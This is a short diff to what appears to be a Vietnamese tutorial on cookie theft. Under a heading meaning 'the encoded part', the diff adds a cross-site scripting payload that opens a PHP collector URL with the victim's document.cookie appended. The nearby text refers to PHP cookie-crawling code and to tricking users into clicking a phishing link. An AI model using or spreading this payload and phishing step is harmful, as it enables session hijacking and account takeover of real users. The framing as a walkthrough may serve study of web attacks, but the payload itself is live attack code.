@@ -53,6 +53,10 @@ Code php crawl cookie:
     </body>
 </html>
 ```
+Phần bị mã hóa: 	   
+```javascript
+<script>window.open("http://localhost/get.php?cookie="+document.cookie)</script>
+```
 
 Tiếp theo, lừa người dùng click vào link phishing
 
